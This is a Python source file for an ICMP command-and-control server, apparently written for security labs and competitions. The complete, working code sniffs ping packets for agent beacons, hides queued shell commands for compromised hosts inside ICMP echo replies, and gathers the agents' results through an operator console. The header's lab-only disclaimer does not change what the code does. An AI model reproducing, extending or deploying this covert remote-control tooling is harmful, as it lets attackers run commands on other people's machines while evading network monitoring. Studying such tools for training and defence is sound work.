"""
Author: Miller Swank
Date: 2025-09-24
Description: ICMP C2 server for educational cybersecurity testing and competitions.
             Handles agent beacons, command queueing, and result collection.
Note: For lab/competition purposes only. Do not run in production environments.
"""

from scapy.all import *
import threading
import time
import os

C2_IP = "192.168.10.50"  # Your C2 server IP
MAX_CLIENTS = 50
COMMANDS = {}    # agent_id -> list of queued commands
RESULTS = {}     # agent_id -> list of (seq, data) results
ACTIVE_AGENTS = set()
LAST_SEEN = {}   # agent_id -> last beacon timestamp
INACTIVITY_TIMEOUT = 10  # seconds before agent considered stale

lock = threading.Lock()

def handle_request(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8 and Raw in pkt:
        payload = pkt[Raw].load.decode(errors="ignore")
        fields = payload.split("|", 3)

        if len(fields) < 4:
            return

        agent_id, msg_type, seq_str, data = fields
        agent_id = agent_id.strip()
        msg_type = msg_type.strip()
        data = data.strip()
        try:
            seq = int(seq_str)
        except:
            seq = 0

        with lock:
            ACTIVE_AGENTS.add(agent_id)
            LAST_SEEN[agent_id] = time.time()

            if msg_type == "BEACON":
                # Send next queued command or NO_CMD
                cmd_list = COMMANDS.get(agent_id, [])
                if cmd_list:
                    next_cmd = cmd_list.pop(0)
                    reply_payload = f"{agent_id}|CMD|0|{next_cmd}"
                else:
                    reply_payload = f"{agent_id}|NO_CMD|0|"
                send(IP(dst=pkt[IP].src)/ICMP(type=0)/reply_payload, verbose=0)

            elif msg_type == "RESULT":
                RESULTS.setdefault(agent_id, []).append((seq, data))
                reply_payload = f"{agent_id}|ACK|{seq}|"
                send(IP(dst=pkt[IP].src)/ICMP(type=0)/reply_payload, verbose=0)

def operator_console():
    print("[*] Operator console ready. Type 'help' for commands.")
    while True:
        cmd = input("C2> ").strip()
        if cmd == "list":
            with lock:
                now = time.time()
                # Lazy prune stale agents
                for agent in list(ACTIVE_AGENTS):
                    if now - LAST_SEEN.get(agent, 0) > INACTIVITY_TIMEOUT:
                        ACTIVE_AGENTS.remove(agent)
                        LAST_SEEN.pop(agent, None)
                        COMMANDS.pop(agent, None)
                        RESULTS.pop(agent, None)
                        print(f"[PRUNE] Removed stale agent {agent}")

                if ACTIVE_AGENTS:
                    print("[*] Active agents:")
                    for agent in ACTIVE_AGENTS:
                        age = int(now - LAST_SEEN.get(agent, now))
                        print(f" - {agent} (last seen {age}s ago)")
                else:
                    print("No active agents yet.")

        elif cmd.startswith("task "):
            try:
                # Split only on first 2 spaces so command can have spaces
                _, agent_id, command = cmd.split(" ", 2)
                with lock:
                    COMMANDS.setdefault(agent_id, []).append(command)
                    print(f"[+] Queued command for {agent_id}: {command}")
            except Exception:
                print("Usage: task <agent_id> <command>")

        elif cmd.startswith("results "):
            try:
                agent_id = cmd.split(" ", 1)[1]
                with lock:
                    chunks = sorted(RESULTS.get(agent_id, []))
                    if not chunks:
                        print(f"No results for {agent_id}")
                        continue
                    # Combine all chunks into a single string
                    full_result = "".join(chunk for _, chunk in chunks)
                    print(f"--- Results from {agent_id} ---")
                    print(full_result)
                    print("-------------------------------")
                    # Clear after printing
                    RESULTS[agent_id] = []
            except Exception as e:
                print("Usage: results <agent_id>", e)

        elif cmd == "help":
            print("Commands:")
            print("  list                 - List active agents")
            print("  task <id> <cmd>      - Queue a command for an agent")
            print("  results <id>         - Show results from an agent")
            print("  exit                 - Stop the server")

        elif cmd == "exit":
            print("[*] Stopping server...")
            os._exit(0)

        else:
            print("Unknown command. Type 'help'.")

def start_c2():
    print("[*] Starting ICMP C2 server...")
    threading.Thread(target=operator_console, daemon=True).start()
    sniff(filter="icmp", prn=handle_request)

if __name__ == "__main__":
    start_c2()



